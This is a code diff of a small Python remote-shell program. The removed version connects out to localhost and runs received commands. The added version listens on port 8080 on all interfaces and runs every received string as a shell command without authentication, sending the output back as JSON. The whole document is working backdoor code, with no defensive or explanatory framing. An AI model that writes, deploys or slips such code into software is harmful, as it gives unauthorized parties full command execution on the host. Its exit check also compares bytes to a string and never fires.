@@ -1,9 +1,39 @@
-from subprocess import PIPE, run
 import socket
-soc=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-soc.connect(("localhost",8080))
+import sys
+from json import dumps
+from subprocess import PIPE, run
+
+
+class Client:
+
+    def __init__(self) -> None:
+        self.incomingSocket,self.clientAddress,self.socket=(False,False,False)
+
+    def listen(self):
+        try:
+            address,port,nofclis= ('',8080,100)
+            self.socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            self.socket.bind((address,port))
+            self.socket.listen(nofclis)
+            self.socket.settimeout(1000)
+            
+            print("Listening")
+            self.incomingSocket,self.clientAddress=self.socket.accept()
+            
+            print("Incoming Connnection from "+ self.clientAddress[0])
+            
+
+        except:
+            print('timeout') 
+
+    def execute(self):
+        recdata =self.incomingSocket.recv(20024)
+        if recdata.strip() == 'exit':sys.exit()
+        terminal=run(recdata.decode(),stdout=PIPE,shell=True,stderr=PIPE,universal_newlines=True)
+        self.incomingSocket.send(dumps({'op':terminal.stdout,'err':terminal.stderr}).encode())
+
+
+client = Client()
+client.listen()
 while True:
-    recdata=soc.recv(1024)
-    print(recdata.decode())
-    terminal=run(recdata.decode(),stdout=PIPE,shell=True,stderr=PIPE,universal_newlines=True).stdout
-    soc.send(terminal.encode())
+    client.execute()
